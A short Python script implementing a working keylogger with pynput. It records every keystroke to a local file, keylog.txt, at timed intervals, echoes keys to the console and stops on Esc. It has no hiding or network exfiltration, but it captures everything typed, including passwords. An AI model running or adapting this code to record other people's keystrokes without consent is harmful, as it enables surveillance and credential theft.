#!/usr/bin/env python3
import time
import threading
from typing import Optional
from pynput import keyboard

class KeyLogger:
    def __init__(self, time_interval: int = 60, logfile: str = "keylog.txt") -> None:
        self.time_interval = int(time_interval)
        self.log = "KeyLogger started at: " + time.strftime("%Y-%m-%d %H:%M:%S") + "\n"
        self.logfile = logfile
        self._timer: Optional[threading.Timer] = None
        self._running = False

    def append_to_log(self, string: str) -> None:
        assert isinstance(string, str)
        self.log += string

    def on_press(self, key) -> Optional[bool]:
        try:
            current_key = str(key.char)
        except AttributeError:
            # use keyboard.Key constants for special keys
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.enter:
                current_key = "[ENTER]\n"
            elif key == keyboard.Key.esc:
                print("Esc pressed — stopping listener.")
                return False  # stop listener
            else:
                current_key = f" [{key}] "
        self.append_to_log(current_key)
        # optional live observation
        print(current_key, end='', flush=True)

    def _flush_to_file(self) -> None:
        """Write current buffer to file and clear it."""
        with open(self.logfile, 'a', encoding='utf-8') as f:
            f.write(self.log + "\n")
        self.log = f"--- segment at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n"

    def report_and_schedule(self) -> None:
        """Flush to local file and schedule next flush."""
        if not self._running:
            return
        self._flush_to_file()
        self._timer = threading.Timer(self.time_interval, self.report_and_schedule)
        self._timer.daemon = True
        self._timer.start()

    def start(self) -> None:
        """Start listening and periodic flushes."""
        self._running = True
        self.report_and_schedule()
        listener = keyboard.Listener(on_press=self.on_press)
        with listener:
            listener.join()
        # after listener stops:
        self._running = False
        if self._timer:
            self._timer.cancel()
        # final flush
        self._flush_to_file()
        print("\nKeyLogger stopped. Log written to", self.logfile)
